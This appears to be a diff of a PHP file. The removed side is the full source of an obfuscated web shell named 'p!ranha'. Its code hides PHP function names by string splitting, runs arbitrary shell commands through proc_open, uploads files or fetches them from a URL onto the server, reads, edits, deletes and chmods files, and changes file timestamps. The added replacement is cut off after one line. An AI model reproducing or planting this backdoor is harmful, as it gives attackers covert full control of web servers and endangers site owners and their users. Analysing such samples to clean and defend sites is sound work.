@@ -1,83 +1,2347 @@
-<!DOCTYPE html><html><head><meta name="author" content="p!ranha by3p4ss"><meta name="robots" content="noindex, nofollow, noarchive"><meta name="viewport" content="width=device-width, initial-scale=0.1"><link rel="icon" href="https://i.ibb.co/g68BBXn/piranha.png" type="image/x-icon"><title>p!ranha?</title></head><body bgcolor="#580f0f" text="#ffffff"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><style>@import url('https://fonts.googleapis.com/css2?family=Asap+Condensed:wght@500&display=swap');@import url('https://fonts.googleapis.com/css?family=Russo+One');body {font-family: 'Asap Condensed', sans-serif;text-shadow:0px 0px 1px #ba2c1c;cursor: url(http://cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important;}body::-webkit-scrollbar { width: 12px;}body::-webkit-scrollbar-track { background: #580f0f;}body::-webkit-scrollbar-thumb { background-color: #580f0f; border: 3px solid gray;}#content tr:hover {background-color: #410909;text-shadow:0px 0px 10px #fff;}#content .first {background-color: #410909;}#content .first:hover {background-color: #410909text-shadow:0px 0px 1px #ffffff;}table {border: 0px #410909 solid;table-layout: fixed;}td {word-wrap: break-word;}a {color: #ffffff;text-decoration: none;}a:hover {color: #000000;text-shadow:0px 0px 10px #ffffff;}input,select,textarea {border: 1px #FFFFFF solid;-moz-border-radius: 5px;-webkit-border-radius:5px;border-radius:5px;}.gas {background-color: #580f0f;color: #ffffff;cursor: pointer;}select {background-color: transparent;color: #ffffff;}select:after {cursor: pointer;}.linka {background-color: transparent;color: #ffffff;}.up {background-color: transparent;color: #fff;}option {background-color: #580f0f;}.btf {background: transparent;border: 1px #fff solid;cursor: pointer;}::-webkit-file-upload-button { background: transparent; color: #fff; border-color: #fff; cursor: pointer;}</style><center><?php echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>';set_time_limit(0);error_reporting(0);$gcw="ge"."tc"."wd";$exp="ex"."plo"."de";$fpt="fi"."le_p"."ut_co"."nte"."nts";$fgt="f"."ile_g"."et_c"."onten"."ts";$sts="s"."trip"."slash"."es";$scd="sc"."a"."nd"."ir";$fxt="fi"."le_"."exis"."ts";$idi="i"."s_d"."ir";$ulk="un"."li"."nk";$ifi="i"."s_fi"."le";$sub="subs"."tr";$spr="sp"."ri"."ntf";$fp="fil"."epe"."rms";$chm="ch"."m"."od";$ocd="oc"."td"."ec";$isw="i"."s_wr"."itab"."le";$idr="i"."s_d"."ir";$ird="is"."_rea"."da"."ble";$isr="is_"."re"."adab"."le";$fsz="fi"."lesi"."ze";$rd="r"."ou"."nd";$igt="in"."i_g"."et";$fnct="fu"."nc"."tion"."_exi"."sts";$rad="RE"."M"."OTE_AD"."DR";$rpt="re"."al"."pa"."th";$bsn="ba"."se"."na"."me";$srl="st"."r_r"."ep"."la"."ce";$sps="st"."rp"."os";$mkd="m"."kd"."ir";$wb=(isset($_SERVER['H'.'T'.'TP'.'S'])&&$_SERVER['H'.'T'.'TP'.'S']==='o'.'n'?"ht"."tp"."s":"ht"."tp")."://".$_SERVER['HT'.'TP'.'_H'.'OS'.'T'];$disfunc=@$igt("dis"."abl"."e_f"."unct"."ion"."s");if(empty($disfunc)){$disf="<font color='#ff1818'>NONE</font>";}else{$disf="<font color='red'>".$disfunc."</font>";}function cekdir(){if(isset($_GET['loknya'])){$lokasi=$_GET['loknya'];}else{$lokasi="ge"."t"."cw"."d";$lokasi=$lokasi();}$b="i"."s_w"."ri"."tab"."le";if($b($lokasi)){return "<font color='#009c12'>Writeable</font>";}else{return "<font color='red'>Writeable</font>";}}function crt(){$a="is"."_w"."ri"."tab"."le";if($a($_SERVER['DO'.'CU'.'ME'.'NT'.'_RO'.'OT'])){return "<font color='#009c12'>Writeable</font>";}else{return "<font color='red'>Writeable</font>";}}function xrd($lokena){$a="s"."ca"."nd"."ir";$items=$a($lokena);foreach($items as $item){if($item==='.'||$item==='..'){continue;}$b="is"."_di"."r";$loknya=$lokena.'/'.$item;if($b($loknya)){xrd($loknya);}else{$c="u"."nl"."in"."k";$c($loknya);}}$d="rm"."di"."r";$d($lokena);}function cfn($fl){$a="ba"."sena"."me";$b="pat"."hinf"."o";$c=$b($a($fl),loknyaINFO_EXTENSION);if($c=="zip"){return '<i class="fa fa-file-zip-o" style="color: #d6d4ce"></i>';}elseif(preg_match("/jpeg|jpg|png|ico/im",$c)){return '<i class="fa fa-file-image-o" style="color: #d6d4ce"></i>';}elseif($c=="txt"){return '<i class="fa fa-file-text-o" style="color: #d6d4ce"></i>';}elseif($c=="pdf"){return '<i class="fa fa-file-pdf-o" style="color: #d6d4ce"></i>';}elseif($c=="html"){return '<i class="fa fa-file-code-o" style="color: #d6d4ce"></i>';}else{return '<i class="fa fa-file-o" style="color: #d6d4ce"></i>';}}function ipsrv(){$a="g"."eth"."ost"."byna"."me";$b="fun"."cti"."on_"."exis"."ts";$c="S"."ERVE"."R_AD"."DR";$d="SE"."RV"."ER_N"."AM"."E";if($b($a)){return $a($_SERVER[$d]);}else{return $a($_SERVER[$c]);}}function ggr($fl){$a="fun"."cti"."on_"."exis"."ts";$b="po"."si"."x_ge"."tgr"."gid";$c="fi"."le"."gro"."up";if($a($b)){if(!$a($c)){return "?";}$d=$b($c($fl));if(empty($d)){$e=$c($fl);if(empty($e)){return "?";}else{return $e;}}else{return $d['name'];}}elseif($a($c)){return $c($fl);}else{return "?";}}function gor($fl){$a="fun"."cti"."on_"."exis"."ts";$b="po"."s"."ix_"."get"."pwu"."id";$c="fi"."le"."o"."wn"."er";if($a($b)){if(!$a($c)){return "?";}$d=$b($c($fl));if(empty($d)){$e=$c($fl);if(empty($e)){return "?";}else{return $e;}}else{return $d['name'];}}elseif($a($c)){return $c($fl);}else{return "?";}}function fdt($fl){$a="da"."te";$b="fil"."emt"."ime";return $a("F d Y H:i:s",$b($fl));}function dunlut($fl){$a="fil"."e_exi"."sts";$b="ba"."sena"."me";$c="fi"."les"."ize";$d="read"."fi"."le";if($a($fl)&&isset($fl)){header('Con'.'tent-Descr'.'iption: Fi'.'le Tra'.'nsfer');header("Conte'.'nt-Control:public");header('Cont'.'ent-Type: a'.'pp'.'licat'.'ion/oc'.'tet-s'.'tream');header('Cont'.'ent-Dis'.'posit'.'ion: at'.'tachm'.'ent; fi'.'lena'.'me="'.$b($fl).'"');header('Exp'.'ires: 0');header("Ex"."pired:0");header('Cac'.'he-Cont'.'rol: must'.'-revali'.'date');header("Cont"."ent-Tran"."sfer-Enc"."oding:bi"."nary");header('Pra'.'gma: pub'.'lic');header('Con'.'ten'.'t-Le'.'ngth: '.$c($fl));flush();$d($fl);exit;}else{return "Fi"."le Not F"."ound !";}}function komend($kom,$lk){$x="pr"."eg_"."mat"."ch";$xx="2".">"."&"."1";if(!$x("/".$xx."/i",$kom)){$kom=$kom." ".$xx;}$a="fu"."ncti"."on_"."ex"."is"."ts";$b="p"."ro"."c_op"."en";$c="htm"."lspe"."cialc"."hars";$d="s"."trea"."m_g"."et_c"."ont"."ents";if($a($b)){$ps=$b($kom,array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","r")),$meki,$lk);return "<pre>".$c($d($meki[1]))."</pre>";}else{return "pr"."oc"."_op"."en f"."unc"."tio"."n i"."s di"."sabl"."ed !";}}function memeklim($text){echo "<center><font color='#009c12'>".$text."</center></font>";}function red($text){echo "<center><font color='red'>".$text."</center></font>";}function oren($text){return "<center><font color='#ff6969'>".$text."</center></font>";}function tuls($nm,$lk){return "[ <a href='".$lk."'>".$nm."</a> ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";}echo "Se"."rv"."er"." I"."P : <font color=#ff1818>".ipsrv()."</font> &nbsp;/&nbsp; Yo"."ur I"."P : <font color=#ff1818>".$_SERVER[$rad]."</font><br>";echo "We"."b S"."erv"."er : <font color='#ff1818'>".$_SERVER['SE'.'RV'.'ER_'.'SOF'.'TWA'.'RE']."</font><br>";$unm="ph"."p_u"."na"."me";echo "Sys"."tem : <font color='#ff1818'>".@$unm()."</font><br>";$gcu="g"."et_"."curr"."ent"."_us"."er";$gmu="g"."et"."my"."ui"."d";echo "Us"."er : <font color='#ff1818'>".@$gcu()."&nbsp;</font>( <font color='#ff1818'>".@$gmu()."</font>)<br>";$phv="ph"."pve"."rsi"."on";echo "PH"."P V"."er"."sio"."n : <font color='#ff1818'>".@$phv()."</font><br>";echo "Dis"."abl"."e Fu"."nct"."ion : ".$disf."</font><br>";echo "MySQL : ";if(@$fnct("my"."sql_co"."nne"."ct")){echo "<font color=#009c12>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;|&nbsp; cURL : ";if(@$fnct("cu"."rl"."_in"."it")){echo "<font color=#009c12>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;|&nbsp; WG"."ET : ";if(@$fxt("/"."us"."r/b"."in/w"."get")){echo "<font color=#009c12>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;|&nbsp; Pe"."rl : ";if(@$fxt("/u"."sr/b"."in"."/pe"."rl")){echo "<font color=#009c12>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;|&nbsp; Pyt"."ho"."n : ";if(@$fxt("/"."us"."r/b"."in/p"."ytho"."n2")){echo "<font color=#009c12>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;|&nbsp; S"."u"."do : ";if(@$fxt("/"."us"."r/b"."in/s"."u"."d"."o")){echo "<font color=#009c12>ON</font>";}else{echo "<font color=red>OFF</font>";}echo " &nbsp;|&nbsp; Pk"."e"."x"."e"."c : ";if(@$fxt("/"."us"."r/b"."in/p"."k"."e"."x"."e"."c")){echo "<font color=#009c12>ON</font>";}else{echo "<font color=red>OFF</font>";}echo "<br>Di"."rect"."ory : &nbsp;";foreach($_POST as $key=>$value){$_POST[$key]=$sts($value);}if(isset($_GET['loknya'])){$lokasi=$_GET['loknya'];$lokdua=$_GET['loknya'];}else{$lokasi=$gcw();$lokdua=$gcw();}$lokasi=$srl('\\','/',$lokasi);$lokasis=$exp('/',$lokasi);$lokasinya=@$scd($lokasi);foreach($lokasis as $id=>$lok){if($lok==''&&$id==0){$a=true;echo '<a href="?loknya=/">/</a>';continue;}if($lok=='')continue;echo '<a href="?loknya=';for($i=0;$i<=$id;$i++){echo"$lokasis[$i]";if($i!=$id)echo "/";}echo '">'.$lok.'</a>/';}echo '</td></tr><tr><td><br>';if(isset($_POST['upwkwk'])){if(isset($_POST['berkasnya'])){if($_POST['dirnya']=="2"){$lokasi=$_SERVER['DOC'.'UME'.'NT_R'.'OOT'];}if(empty($_FILES['berkas']['name'])){echo "<font color=#ff6969>Fi"."le not Se"."lected !</font><br><br>";}else{$data=@$fpt($lokasi."/".$_FILES['berkas']['name'],@$fgt($_FILES['berkas']['tm'.'p_na'.'me']));if($fxt($lokasi."/".$_FILES['berkas']['name'])){$fl=$lokasi."/".$_FILES['berkas']['name'];echo "Fi"."le Upl"."oa"."ded ! &nbsp;<font color='#ff1818'><i>".$fl."</i></font><br>";if($sps($lokasi,$_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'])!==false){$lwb=$srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'],$wb."/",$fl);echo "Li"."nk : <a href='".$lwb."'><font color='#ff1818'>".$lwb."</font></a><br>";}echo "<br>";}else{echo "<font color='red'>Fa"."ile"."d to Up"."lo"."ad !</font><br><br>";}}}elseif(isset($_POST['linknya'])){if(empty($_POST['namalink'])){echo "<font color=#ff6969>Fi"."lename cannot be empty !</font><br><br>";}elseif(empty($_POST['darilink'])){echo "<font color=#ff6969>Link cannot be empty !</font><br><br>";}else{if($_POST['dirnya']=="2"){$lokasi=$_SERVER['DOC'.'UME'.'NT_R'.'OOT'];}$data=@$fpt($lokasi."/".$_POST['namalink'],@$fgt($_POST['darilink']));if($fxt($lokasi."/".$_POST['namalink'])){$fl=$lokasi."/".$_POST['namalink'];echo "Fi"."le Uplo"."ade"."d ! &nbsp;<font color='#ff1818'><i>".$fl."</i></font><br>";if($sps($lokasi,$_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'])!==false){$lwb=$srl($_SERVER['DO'.'CU'.'M'.'ENT'.'_R'.'OO'.'T'],$wb."/",$fl);echo "Li"."nk : <a href='".$lwb."'><font color='#ff1818'>".$lwb."</font></a><br>";}echo "<br>";}else{echo "<font color='red'>Fa"."iled to Up"."lo"."ad !</font><br><br>";}}}}echo "Uplo"."ad Fi"."le : ";echo '<form enctype="multip'.'art/form'.'-data" method="p'.'ost">
-<input type="radio" value="1" name="dirnya" checked>Curr3nt_D!r [ '.cekdir().' ]
-<input type="radio" value="2" name="dirnya" >D0cum3nt_r0Ot [ '.crt().' ]<br>
-<input type="hidden" name="upwkwk" value="aplod">
-<input type="fi'.'le" name="berkas"><input type="submit" name="berkasnya" value="G'.'O!" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" size="59" placeholder="https://pir'.'an'.'ha'.'.go'.'.id'.'/ev'.'il'.'66'.'6k'.'ids">&nbsp;<input type="text" name="namalink" class="up" size="14" placeholder="sa'.'ved.'.'txt"><input type="submit" name="linknya" class="up" value="G'.'0!" style="cursor: pointer; border-color: #fff">
-</form><form method="post" enctype="application/x-www-form-urlencoded">Co'.'mm'.'an'.'d : <input type="text" name="komend" class="up" style="cursor: pointer; border: 0px;border-color: #FFFFFFF;width:700px" value="'.htmlspecialchars($_POST['komend']).'">
-<input type="submit" name="komends" value="E'.'x3'.'cu'.'t3!" class="up" style="cursor: pointer; border-color: #fff">
-</form>';echo "</table>";if(isset($_GET['lokasie'])){echo "<tr><td>Current Fi"."le : ".$_GET['lokasie'];echo '</tr></td></table><br/>';echo "<pre>".htmlspecialchars($fgt($_GET['lokasie']))."</pre>";}elseif(isset($_POST['loknya'])&&$_POST['pilih']=="hapus"){if($idi($_POST['loknya'])&&$fxt($_POST['loknya'])){xrd($_POST['loknya']);if($fxt($_POST['loknya'])){red("Fai"."led to del"."ete Dir"."ec"."tory !");}else{memeklim("Del"."ete Dir"."ect"."ory Suc"."cess !");}}elseif($ifi($_POST['loknya'])&&$fxt($_POST['loknya'])){@$ulk($_POST['loknya']);if($fxt($_POST['loknya'])){red("Failed to Delete Fi"."le !");}else{memeklim("De"."le"."te Fi"."le Succ"."ess !");}}else{red("Fi"."le / Dir"."ecto"."ry not Fo"."und !");}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="ubahmod"){if(!isset($_POST['cemod'])){if($_POST['ty'.'pe']=="fi"."le"){echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";}else{echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";}echo '<form method="post">
-		Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o',$fp($_POST['loknya'])),-4).'" />
-		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-		<input type="hidden" name="pilih" value="ubahmod">';if($_POST['ty'.'pe']=="fi"."le"){echo '<input type="hidden" name="type" value="fi'.'le">';}else{echo '<input type="hidden" name="type" value="di'.'r">';}echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
-		</form><br>';}else{$cm=@$chm($_POST['loknya'],$ocd($_POST['perm']));if($cm==true){memeklim("Change Mod Success !");if($_POST['ty'.'pe']=="fi"."le"){echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";}else{echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";}echo '<form method="post">
-			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o',$fp($_POST['loknya'])),-4).'" />
-			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-			<input type="hidden" name="pilih" value="ubahmod">';if($_POST['ty'.'pe']=="fi"."le"){echo '<input type="hidden" name="type" value="fi'.'le">';}else{echo '<input type="hidden" name="type" value="di'.'r">';}echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';}else{red("Change Mod Failed !");if($_POST['ty'.'pe']=="fi"."le"){echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";}else{echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";}echo '<form method="post">
-			Pe'.'rmi'.'ss'.'ion : <input name="perm" type="text" class="up" size="4" maxlength="4" value="'.$sub($spr('%o',$fp($_POST['loknya'])),-4).'" />
-			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-			<input type="hidden" name="pilih" value="ubahmod">';if($_POST['ty'.'pe']=="fi"."le"){echo '<input type="hidden" name="type" value="fi'.'le">';}else{echo '<input type="hidden" name="type" value="di'.'r">';}echo '<input type="submit" value="Change" name="cemod" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';}}}elseif(isset($_POST['loknya'])&&$_POST['pilih']=="ubahnama"){if(isset($_POST['gantin'])){$namabaru=$_GET['loknya']."/".$_POST['newname'];$ceen="re"."na"."me";if(@$ceen($_POST['loknya'],$namabaru)===true){memeklim("Change Name Success");if($_POST['ty'.'pe']=="fi"."le"){echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";}else{echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";}echo '<form method="post">
-			New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($_POST['newname']).'" />
-			<input type="hidden" name="loknya" value="'.$_POST['newname'].'">
-			<input type="hidden" name="pilih" value="ubahnama">';if($_POST['ty'.'pe']=="fi"."le"){echo '<input type="hidden" name="type" value="fi'.'le">';}else{echo '<input type="hidden" name="type" value="di'.'r">';}echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';}else{red("Change Name Failed");}}else{if($_POST['ty'.'pe']=="fi"."le"){echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";}else{echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";}echo '<form method="post">
-		New Name : <input name="newname" type="text" class="up" size="20" value="'.htmlspecialchars($bsn($_POST['loknya'])).'" />
-		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-		<input type="hidden" name="pilih" value="ubahnama">';if($_POST['ty'.'pe']=="fi"."le"){echo '<input type="hidden" name="type" value="fi'.'le">';}else{echo '<input type="hidden" name="type" value="di'.'r">';}echo '<input type="submit" value="Change" name="gantin" class="up" style="cursor: pointer; border-color: #fff"/>
-		</form><br>';}}elseif(isset($_GET['pilihan'])&&$_POST['pilih']=="edit"){if(isset($_POST['gasedit'])){$edit=@$fpt($_POST['loknya'],$_POST['src']);if($fgt($_POST['loknya'])==$_POST['src']){memeklim("Ed"."it Fi"."le Suc"."ce"."ss !");}else{red("Ed"."it Fi"."le Fai"."led !");}}echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br><br>";echo '<form method="post">
-	<textarea cols=80 rows=20 name="src">'.htmlspecialchars($fgt($_POST['loknya'])).'</textarea><br>
-	<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-	<input type="hidden" name="pilih" value="ed'.'it">
-	<input type="submit" value="Ed'.'it Fi'.'le" name="gasedit" class="up" style="cursor: pointer; border-color: #fff"/>
-	</form><br>';}elseif(isset($_POST['komends'])){if(isset($_POST['komend'])){if(isset($_GET['loknya'])){$lk=$_GET['loknya'];}else{$lk=$gcw();}$km='ko'.'me'.'nd';echo $km($_POST['komend'],$lk);exit();}}elseif(isset($_POST['loknya'])&&$_POST['pilih']=="ubahtanggal"){if(isset($_POST['tanggale'])){$stt="st"."rtot"."ime";$tch="t"."ou"."ch";$tanggale=$stt($_POST['tanggal']);if(@$tch($_POST['loknya'],$tanggale)===true){memeklim("Change Da"."te Succ"."ess !");$det="da"."te";$ftm="fi"."le"."mti"."me";$b=$det("d F Y H:i:s",$ftm($_POST['loknya']));if($_POST['ty'.'pe']=="fi"."le"){echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";}else{echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";}echo '<form method="post">
-			New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
-			<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-			<input type="hidden" name="pilih" value="ubahtanggal">';if($_POST['ty'.'pe']=="fi"."le"){echo '<input type="hidden" name="type" value="fi'.'le">';}else{echo '<input type="hidden" name="type" value="di'.'r">';}echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
-			</form><br>';}else{red("Fai"."led to Cha"."nge Da"."te !");}}else{$det="da"."te";$ftm="fi"."le"."mti"."me";$b=$det("d F Y H:i:s",$ftm($_POST['loknya']));if($_POST['ty'.'pe']=="fi"."le"){echo "<center>Fi"."le : ".htmlspecialchars($_POST['loknya'])."<br>";}else{echo "<center>D"."ir : ".htmlspecialchars($_POST['loknya'])."<br>";}echo '<form method="post">
-		New Da'.'te : <input name="tanggal" type="text" class="up" size="20" value="'.$b.'" />
-		<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-		<input type="hidden" name="pilih" value="ubahtanggal">';if($_POST['ty'.'pe']=="fi"."le"){echo '<input type="hidden" name="type" value="fi'.'le">';}else{echo '<input type="hidden" name="type" value="di'.'r">';}echo '<input type="submit" value="Change" name="tanggale" class="up" style="cursor: pointer; border-color: #fff"/>
-		</form><br>';}}elseif(isset($_POST['loknya'])&&$_POST['pilih']=="dunlut"){$dunlute=$_POST['loknya'];if($fxt($dunlute)&&isset($dunlute)){if($ird($dunlute)){dunlut($dunlute);}elseif($idr($fl)){red("That is Di"."rec"."tory, Not Fi"."le -_-");}else{red("Fi"."le is Not Re"."adab"."le !");}}else{red("Fi"."le Not Fo"."und !");}}elseif(isset($_POST['loknya'])&&$_POST['pilih']=="fo"."ld"."er"){if($isw("./")||$ird("./")){$loke=$_POST['loknya'];if(isset($_POST['buatfolder'])){$buatf=$mkd($loke."/".$_POST['fo'.'lde'.'rba'.'ru']);if($buatf==true){memeklim("Folder <b>".htmlspecialchars($_POST['fo'.'lde'.'rba'.'ru'])."</b> Created !");echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-                <input type="hidden" name="pilih" value="folder"></form>';}else{red("Failed to Create folder !");echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'">
-                <input type="hidden" name="pilih" value="folder"></form>';}}else{echo '<form method="post"><center>Folder : <input type="text" name="fo'.'lde'.'rba'.'ru" class="up"> <input type="submit" name="buatfolder" value="Create folder" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="folder"></form>';}}}elseif(isset($_POST['lok'.'nya'])&&$_POST['pilih']=="fi"."le"){if($isw("./")||$isr("./")){$loke=$_POST['lok'.'nya'];if(isset($_POST['buatfi'.'le'])){$buatf=$fpt($loke."/".$_POST['fi'.'lebaru'],"");if($fxt($loke."/".$_POST['fi'.'lebaru'])){memeklim("File <b>".htmlspecialchars($_POST['fi'.'lebaru'])."</b> Created !");echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
-                <input type="hidden" name="pilih" value="fi'.'le"></form>';}else{red("Failed to Create File !");echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'">
-                <input type="hidden" name="pilih" value="fi'.'le"></form>';}}else{echo '<form method="post"><center>Filename : <input type="text" name="fi'.'lebaru" class="up"> <input type="submit" name="buatfi'.'le" value="Create File" class="up" style="cursor: pointer; border-color: #fff"><br><br></center>';echo '<input type="hidden" name="loknya" value="'.$_POST['lok'.'nya'].'"><input type="hidden" name="pilih" value="fi'.'le"></form>';}}}echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr class="first">
-<td><center>N4'.'m3</center></td>
-<td><center>5!'.'z3</center></td>
-<td><center>L45'.'t M0'.'d!f'.'!3d</center></td>
-<td><center>0'.'wn'.'3r / Gr'.'0u'.'p</center></td>
-<td><center>P3'.'Rm!'.'55'.'!0n5</center></td>
-<td><center>0p'.'t!0'.'n5</center></td>
-</tr>';echo "<tr>";$euybrekw=$srl($bsn($lokasi),"",$lokasi);$euybrekw=$srl("//","/",$euybrekw);echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybrekw."\">..</a></td>\n<td><center>--</center></td>\n<td><center>".fdt($euybrekw)."</center></td>\n<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>\n<td><center>";if($isw($euybrekw))echo '<font color="#009c12">';elseif(!$isr($euybrekw))echo '<font color="red">';echo statusnya($euybrekw);if($isw($euybrekw)||!$isr($euybrekw))echo '</font>';echo"</center></td>
-<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
-<input type=\"hidden\" name=\"type\" value=\"dir\">
-<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
-<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
-<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
-</form></center>";echo "</tr>";foreach($lokasinya as $ppkcina){$euybre=$lokasi."/".$ppkcina;$euybre=$srl("//","/",$euybre);if(!$idi($euybre)||$ppkcina=='.'||$ppkcina=='..')continue;echo "<tr>";echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?loknya=".$euybre."\">".$ppkcina."</a></td>\n\t<td><center>--</center></td>\n\t<td><center>".fdt($euybre)."</center></td>\n\t<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>\n\t<td><center>";if($isw($euybre))echo '<font color="#009c12">';elseif(!$isr($euybre))echo '<font color="red">';echo statusnya($euybre);if($isw($euybre)||!$isr($euybre))echo '</font>';echo"</center></td>
-	<td><center><form method=\"POST\" action=\"?pilihan&loknya=$lokasi\">
-	<input type=\"hidden\" name=\"type\" value=\"dir\">
-	<input type=\"hidden\" name=\"name\" value=\"$ppkcina\">
-	<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$ppkcina\">
-	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
-	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
-	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
-	<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
-	</form></center></td>
-	</tr>";}echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';$skd="10"."24";foreach($lokasinya as $mekicina){$euybray=$lokasi."/".$mekicina;if(!$ifi("$lokasi/$mekicina"))continue;$size=$fsz("$lokasi/$mekicina")/$skd;$size=$rd($size,3);if($size>=$skd){$size=$rd($size/$skd,2).' M'.'B';}else{$size=$size.' K'.'B';}echo "<tr>\n<td>".cfn($euybray)." <a href=\"?lokasie=$lokasi/$mekicina&loknya=$lokasi\">$mekicina</a></td>
-<td><center>".$size."</center></td>\n<td><center>".fdt($euybray)."</center></td>\n<td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>\n<td><center>";if($isw("$lokasi/$mekicina"))echo '<font color="#009c12">';elseif(!$isr("$lokasi/$mekicina"))echo '<font color="red">';echo statusnya("$lokasi/$mekicina");if($isw("$lokasi/$mekicina")||!$isr("$lokasi/$mekicina"))echo '</font>';echo"</center></td><td><center>
-<form method=\"post\" action=\"?pilihan&loknya=$lokasi\">
-<button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
-<button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>\n<button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>\n<input type=\"hidden\" name=\"type\" value=\"fi"."le\">
-<input type=\"hidden\" name=\"name\" value=\"$mekicina\">
-<input type=\"hidden\" name=\"loknya\" value=\"$lokasi/$mekicina\">
-</form></center></td>
-</tr>";}echo '</tr></td></table></table>';function statusnya($fl){$a="sub"."st"."r";$b="s"."pri"."ntf";$c="fil"."eper"."ms";$izin=$a($b('%o',$c($fl)),-4);return $izin;} ?>
+<?php
+
+function feedback404()
